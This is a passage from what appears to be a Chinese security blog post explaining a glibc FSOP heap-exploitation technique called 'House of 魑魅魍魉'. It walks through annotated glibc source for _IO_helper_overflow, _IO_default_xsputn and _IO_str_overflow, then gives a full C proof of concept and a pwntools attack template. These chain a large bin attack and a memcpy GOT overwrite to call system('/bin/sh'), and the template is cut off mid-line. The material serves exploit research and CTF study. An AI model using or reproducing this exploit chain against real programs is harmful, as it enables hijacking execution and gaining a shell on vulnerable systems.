fake_printf_buffer_as_file[<span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_printf_buffer_obstack-&gt;ch + <span class="number">1</span>;<span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">6</span>] = fake_printf_buffer_as_file[<span class="number">5</span>];               <span class="comment">// _IO_write_end</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">27</span>] = IO_printf_buffer_as_file_jumps;             <span class="comment">// vtable</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">28</span>] = (<span class="type">size_t</span>) fake_printf_buffer_obstack;        <span class="comment">//next</span></span><br><span class="line"></span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.write_base = <span class="number">0</span>;</span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.write_ptr = <span class="number">0</span>;</span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.write_end = (<span class="type">char</span> *) fake_printf_buffer_as_file[<span class="number">5</span>];</span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.mode = __printf_buffer_mode_obstack;</span><br><span class="line">    fake_printf_buffer_obstack-&gt;obstack = (<span class="keyword">struct</span> obstack *) &amp;fake_printf_buffer_obstack-&gt;obstack;</span><br><span class="line"></span><br><span class="line">    fake_obstack[<span class="number">7</span>] = (<span class="type">size_t</span>) system;</span><br><span class="line">    fake_obstack[<span class="number">9</span>] = (<span class="type">size_t</span>) arg;</span><br><span class="line">    fake_obstack[<span class="number">10</span>] = <span class="number">0x1</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger FSOP.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ## House of 魑魅魍魉 一般来说一类跳表只有一个，但
<code>_IO_helper_jumps</code> 比较特殊，通过下面可以看出，跳表会根据
<code>COMPILE_WPRINTF</code> 值不同而生成不同的，但可能 libc
在编译时调用两次，所以<strong>我们可以在内存中看到两个
<code>_IO_helper_jumps</code>
，</strong>每种各一个。其中，<strong><code>COMPILE_WPRINTF == 0</code>
先生成，<code>COMPILE_WPRINTF == 1</code> 后生成。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_helper_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT (finish, _IO_wdefault_finish),</span><br><span class="line">  JUMP_INIT (overflow, _IO_helper_overflow),</span><br><span class="line">  JUMP_INIT (underflow, _IO_default_underflow),</span><br><span class="line">  JUMP_INIT (uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT (xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT (xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT (seekoff, _IO_default_seekoff),</span><br><span class="line">  JUMP_INIT (seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT (setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT (sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT (doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT (read, _IO_default_read),</span><br><span class="line">  JUMP_INIT (write, _IO_default_write),</span><br><span class="line">  JUMP_INIT (seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT (close, _IO_default_close),</span><br><span class="line">  JUMP_INIT (stat, _IO_default_stat)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_helper_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT (finish, _IO_default_finish),</span><br><span class="line">  JUMP_INIT (overflow, _IO_helper_overflow),</span><br><span class="line">  JUMP_INIT (underflow, _IO_default_underflow),</span><br><span class="line">  JUMP_INIT (uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT (pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT (xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT (xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT (seekoff, _IO_default_seekoff),</span><br><span class="line">  JUMP_INIT (seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT (setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT (sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT (doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT (read, _IO_default_read),</span><br><span class="line">  JUMP_INIT (write, _IO_default_write),</span><br><span class="line">  JUMP_INIT (seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT (close, _IO_default_close),</span><br><span class="line">  JUMP_INIT (stat, _IO_default_stat)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<p>同样，面对不同的 <code>COMPILE_WPRINTF</code> 所对应的
<code>helper_file</code> 也有所不同，区别在于是否需要伪造
<code>struct _IO_wide_data _wide_data;</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">helper_file</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">f</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> _<span class="title">wide_data</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    FILE *_put_stream;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></div>
<p>同样，<code>_IO_helper_overflow</code> 这个函数在内存中也有 2
份。通过测试发现，如果使用 <code>COMPILE_WPRINTF == 0</code>
的情况，在攻击过程中 <code>s-&gt;_IO_write_base</code> 会变成
<code>largebin-&gt;fd_nextsize</code>
指针，从而被强制修改无法控制。为了方便，我们使用
<code>COMPILE_WPRINTF == 1</code> 所生成的
<code>_IO_helper_overflow</code> 。该函数在攻击过程中的作用是控制
<code>_IO_default_xsputn</code> 的三个参数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> _IO_helper_overflow (FILE *s, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *target = ((<span class="keyword">struct</span> helper_file*) s)-&gt;_put_stream;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  <span class="type">int</span> used = s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (used)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 利用这个链，显然这三个参数我们都可控。</span></span><br><span class="line">      <span class="type">size_t</span> written = _IO_sputn (target, s-&gt;_wide_data-&gt;_IO_write_base, used);</span><br><span class="line">      <span class="keyword">if</span> (written == <span class="number">0</span> || written == WEOF)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">      __wmemmove (s-&gt;_wide_data-&gt;_IO_write_base,</span><br><span class="line">          s-&gt;_wide_data-&gt;_IO_write_base + written,</span><br><span class="line">          used - written);</span><br><span class="line">      s-&gt;_wide_data-&gt;_IO_write_ptr -= written;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">// 如果使用这条链，_IO_write_ptr 将处于 largebin 的 bk_size 指针处</span></span><br><span class="line">  <span class="type">int</span> used = s-&gt;_IO_write_ptr - s-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (used)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> written = _IO_sputn (target, s-&gt;_IO_write_base, used);</span><br><span class="line">      <span class="keyword">if</span> (written == <span class="number">0</span> || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      memmove (s-&gt;_IO_write_base, s-&gt;_IO_write_base + written,</span><br><span class="line">           used - written);</span><br><span class="line">      s-&gt;_IO_write_ptr -= written;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> PUTC (c, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>通过上面函数可以清楚看出，在执行
<code>size_t written = _IO_sputn (target, s-&gt;_wide_data-&gt;_IO_write_base, used);</code>
时 -
<code>FILE *target = ((struct helper_file*) s)-&gt;_put_stream;</code>
可控。 - <code>s-&gt;_wide_data-&gt;_IO_write_base</code> 可控。 -
<code>int used = s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base;</code>
可控。</p>
<p>就达成了3个参数可控的要求，然后通过修改
<code>((struct helper_file*) s)-&gt;_put_stream</code> 的
<code>vtable</code> 指向 <code>_IO_str_jumps</code> ，使其调用
<code>_IO_default_xsputn</code> 函数。</p>
<p><strong>需要注意的是，<code>s-&gt;_wide_data-&gt;_IO_write_ptr</code>
和 <code>s-&gt;_wide_data-&gt;_IO_write_base</code> 是
<code>wchar_t *</code> 类型，也就是说used实际是
<code>(s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base) &gt;&gt; 2</code>
。</strong> （在 Linux 系统上，宽字符通常使用 UTF-32 编码表示，而 UTF-32
使用 32 位表示一个字符，因此 <code>wchar_t</code> 类型在 Linux 上通常为
4 字节。）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/da19e1e8f8bdd46028f20d7133c41b81.png"
                     
alt="在这里插入图片描述" 
                > <code>_IO_default_xsputn</code>
函数内要绕过的内容较多。该函数在攻击过程中的作用是两次调用
<code>__mempcpy</code> ，第一次利用任意地址写修改 <code>__mempcpy</code>
对应的 got 表中的值，第二次调用 <code>__mempcpy</code>
劫持程序执行流。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="comment">// 要 more &gt; count，能再次返回执行 __mempcpy</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">          <span class="comment">// 要 count &gt; 20</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 利用此处实现 house of 借刀杀人，</span></span><br><span class="line">          <span class="comment">// 修改 memcpy 的内容为setcontext</span></span><br><span class="line">          <span class="comment">// 再次返回的时候就能够实现 house of 一骑当千</span></span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="type">ssize_t</span> i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">// 要 more &gt; count，能再次返回执行 __mempcpy</span></span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 绕过下面这一行，再次执行for循环的内容</span></span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF) </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure></div>
<p>需要绕过内容总结如下</p>
<ul>
<li><p>需要 <code>more</code> &gt; <code>count</code>，能再次返回执行
<code>__mempcpy</code>，且要想再次返回执行 <code>memcpy</code>，由于此时
<code>f-&gt;_IO_write_ptr</code> 被 <code>_IO_str_overflow</code>
函数修改为指向 <code>"/bin/sh"</code> 字符串，因此
<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>
可能为一个很大的值，导致 <code>count &gt; more</code>，进而更新
<code>count</code> 为 <code>more</code> ，因此再次循环时要求
<code>more &gt; 20</code> 。由于上一次循环中依次执行了
<code>more -= count</code> 和 <code>more--</code> 语句，因此要求
<code>more</code> ≥ <code>count + 1 + 21</code> 。</p></li>
<li><p>需要 <code>count</code> &gt; 20，因此 <code>count</code> 至少为
21 。</p></li>
<li><p>第一次执行
<code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 时，</p>
<ul>
<li><p><code>_IO_write_ptr</code> 为 <code>__mempcpy</code>
表项，</p></li>
<li><p>s 为要写入的内容。</p></li>
</ul></li>
<li><p>再次执行<code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code>
时，</p>
<ul>
<li><p>需要绕过
<code>if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)</code>
，具体绕过方式接下来会介绍。</p></li>
<li><p><code>f-&gt;_IO_write_ptr</code> 为 <code>rdi</code>
，<code>s</code> 为 <code>rsi</code> ，<code>count</code> 为
<code>rdx</code> 。</p></li>
</ul></li>
</ul>
<p>同样，执行 <code>_IO_str_overflow</code>
需要绕过内容也比较多。该函数的作用是控制
<code>fp-&gt;_IO_write_ptr</code> ，从而控制
<code>_IO_default_xsputn</code> 第二次循环中 <code>__mempcpy</code>
的第一个参数。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">    <span class="comment">// 需要进入来控制 fp-&gt;_IO_write_ptr ， _flags==0x400</span></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; <span class="comment">// 控制 fp-&gt;_IO_write_ptr 指向 &amp;&quot;/bin/sh&quot; - 1 作为下一次 memcpy(system) 的第一个参数。</span></span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">    <span class="comment">// 不能进入，要让 _IO_blen (fp)  ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) 足够大。</span></span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"> </span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">      <span class="comment">// 此处 fp-&gt;_IO_write_ptr 自加1，所以之前要少1.</span></span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure></div></p>
<p>需要绕过内容总结如下： - <code>_flags = 0x400</code> 。 -
<code>fp-&gt;_IO_read_ptr</code> 为再次执行
<code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 的
<code>rdi - 1</code> 。 -
<code>(fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</code>
要足够大，一般设置
<code>(fp)-&gt;_IO_buf_end = 0xFFFFFFFFFFFFFFF0</code> 即可。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/60649d737092dba6af8cb8c9977061aa.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_cmwl" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x77040</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2660</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *fake_helper_file = large - <span class="number">2</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_wide_data = fake_helper_file + <span class="number">28</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_put_stream = fake_helper_file + <span class="number">6</span>;</span><br><span class="line">    <span class="type">size_t</span> *write_base = fake_helper_file + <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> memcpy_got_addr = libc_base + <span class="number">0x1d1040</span>;</span><br><span class="line">    <span class="type">size_t</span> IO_helper_jumps_addr = libc_base + <span class="number">0x1cdb20</span>;</span><br><span class="line">    <span class="type">size_t</span> IO_str_jumps_addr = libc_base + <span class="number">0x1ce720</span>;</span><br><span class="line"></span><br><span class="line">    fake_helper_file[<span class="number">4</span>] = <span class="number">0</span>;                        <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_helper_file[<span class="number">5</span>] = <span class="number">1</span>;                        <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_helper_file[<span class="number">17</span>] = (<span class="type">size_t</span>) large + <span class="number">0x1000</span>; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    fake_helper_file[<span class="number">20</span>] = (<span class="type">size_t</span>) fake_wide_data; <span class="comment">// _wide_data</span></span><br><span class="line">    fake_helper_file[<span class="number">27</span>] = IO_helper_jumps_addr;    <span class="comment">// vtable -&gt; _IO_helper_jumps</span></span><br><span class="line">    fake_helper_file[<span class="number">57</span>] = (<span class="type">size_t</span>) fake_put_stream;<span class="comment">// _put_stream</span></span><br><span class="line"></span><br><span class="line">    fake_wide_data[<span class="number">3</span>] = (<span class="type">size_t</span>) write_base;           <span class="comment">// _IO_write_base -&gt; write_base</span></span><br><span class="line">    fake_wide_data[<span class="number">4</span>] = (<span class="type">size_t</span>) write_base + <span class="number">0x80</span> * <span class="number">4</span>;<span class="comment">// _IO_write_base -&gt; write_base +</span></span><br><span class="line"></span><br><span class="line">    fake_put_stream[<span class="number">0</span>] = <span class="number">0x400</span>;                      <span class="comment">// _flags</span></span><br><span class="line">    fake_put_stream[<span class="number">1</span>] = (<span class="type">size_t</span>) &amp;write_base[<span class="number">2</span>] - <span class="number">1</span>;<span class="comment">// _IO_read_ptr -&gt; &amp;&quot;/bin/sh&quot; -1</span></span><br><span class="line">    fake_put_stream[<span class="number">4</span>] = memcpy_got_addr - <span class="number">0x20</span>;     <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_put_stream[<span class="number">5</span>] = memcpy_got_addr;            <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_put_stream[<span class="number">6</span>] = memcpy_got_addr + <span class="number">0x28</span>;     <span class="comment">// _IO_write_end</span></span><br><span class="line">    fake_put_stream[<span class="number">7</span>] = <span class="number">0</span>;                          <span class="comment">// _IO_buf_base</span></span><br><span class="line">    fake_put_stream[<span class="number">8</span>] = (<span class="type">size_t</span>) <span class="number">-1</span>;                <span class="comment">// _IO_buf_end</span></span><br><span class="line">    fake_put_stream[<span class="number">17</span>] = (<span class="type">size_t</span>) large + <span class="number">0x1000</span>;   <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    fake_put_stream[<span class="number">27</span>] = IO_str_jumps_addr;         <span class="comment">// vtable -&gt; _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line">    write_base[<span class="number">0</span>] = (<span class="type">size_t</span>) system;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;write_base[<span class="number">2</span>], <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FSOP</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>攻击模板如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># largebin_attack 攻击 house_魑魅魍魉</span></span><br><span class="line"><span class="comment"># 为确保正确执行，需要利用 COMPILE_WPRINTF==1 的模式</span></span><br><span class="line"> </span><br><span class="line">fake_io_addr = heap_addr + <span class="number">0x1390</span></span><br><span class="line">put_stream_offset = <span class="number">0x30</span>  <span class="comment"># put_stream 距离 fake_io 的偏移</span></span><br><span class="line">put_stream_addr = fake_io_addr + put_stream_offset</span><br><span class="line">write_target_addr = memcpy_addr</span><br><span class="line">target_value_offset = <span class="number">0x200</span>  <span class="comment"># 需要执行的函数存储的地址距离 fake_io 的偏移</span></span><br><span class="line">target_value_addr = fake_io_addr  + target_value_offset</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IO_wide_data_addr = fake_io_addr + <span class="number">0xe0</span> <span class="comment"># len(IO_IFLE) 利用原有的宽字符</span></span><br><span class="line"><span class="comment"># 再一次执行到 memcpy时rdi的地址</span></span><br><span class="line">rdi_offset = <span class="number">0xf</span>  <span class="comment"># 因为 _IO_write_ptr 会加1，此处确保内存对齐</span></span><br><span class="line">rdi_addr = target_value_addr + rdi_offset</span><br><span class="line"><span class="comment"># more_len &gt; count_len &gt; 0x20 可以再次执行 memcpy</span></span><br><span class="line">more_len = <span class="number">0x80</span>*<span class="number">8</span>   <span class="comment"># 为什么 IO_help_jump_0_ 里面还要在右边移位2位？？</span></span><br><span class="line">count_len= <span class="number">0x28</span> <span class="comment"># 要大于0x20</span></span><br><span class="line">_flags = <span class="number">0x400</span> <span class="comment">#_flags == 0x400 执行 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">fake_io_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(_flags) <span class="comment"># 此处是 put_stream 起始地址; _flags == 0x400 执行 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span></span><br><span class="line">fake_io_file += p64(rdi_addr)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(write_target_addr - <span class="number">0x20</span>)</span><br><span class="line">fake_io_file += p64(write_target_addr)</span><br><span class="line">fake_io_file += p64(write_target_addr + count_len)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 用于绕过  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only)) 不执行malloc</span></span><br><span class="line">fake_io_file += p64((<span 